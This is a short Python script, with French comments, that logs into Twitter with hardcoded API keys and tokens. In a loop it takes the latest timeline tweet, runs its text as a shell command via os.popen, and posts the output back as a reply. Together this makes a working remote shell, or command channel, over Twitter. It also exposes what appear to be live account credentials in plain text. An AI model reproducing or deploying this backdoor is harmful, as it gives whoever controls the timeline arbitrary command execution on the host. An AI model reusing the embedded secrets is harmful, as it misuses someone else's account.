#!/usr/bin/python3
# -*- coding: utf-8 -*
import tweepy, os, time

#delai de 10min avant de rentrer dans la boucle
# time.sleep(600)

#import des constante
consumer_key = 'clcdRQAZ5pWG8JiA7QRY5Jdcm'
consumer_secret = 'B1PoTrkH5rugnKihkIzimBpJfJAm54MfBePcLW0LtSfijThn3o'
access_token = '1080810606666698753-KWYuDViHuJLNPVQOmXtIOSPiZd5Pti'
access_token_secret = 'VE1yjXO9haS3GtRVfTJwn1LHO7jSshJkevoEoiznxjvQq'

auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)
api = tweepy.API(auth)

while True:
    #killswitch
    killswitch = api.me().name
    if killswitch == 'Putain de bot':
        #recuper le dernier tweet
        last_tweet = api.home_timeline()[0]
        #essaye d'executer le dernier tweet
        resp = os.popen(last_tweet.text).read()
        if last_tweet.text != 'first':
            #si le retour n'est pas vide, le renvoi et ajoute un message (au cas ou le retour est lui meme executable)
            if resp != '':
                api.update_status(resp, last_tweet.id)
                api.update_status('first', last_tweet.id)
            #si le retour est vide (non executable ou pas de retour ecrit) renvoi un message pour eviter la boucle
            else:
                api.update_status('first', last_tweet.id)
        #ajout d'un delai pour eviter de surcharger l'api twitter
        time.sleep(60)
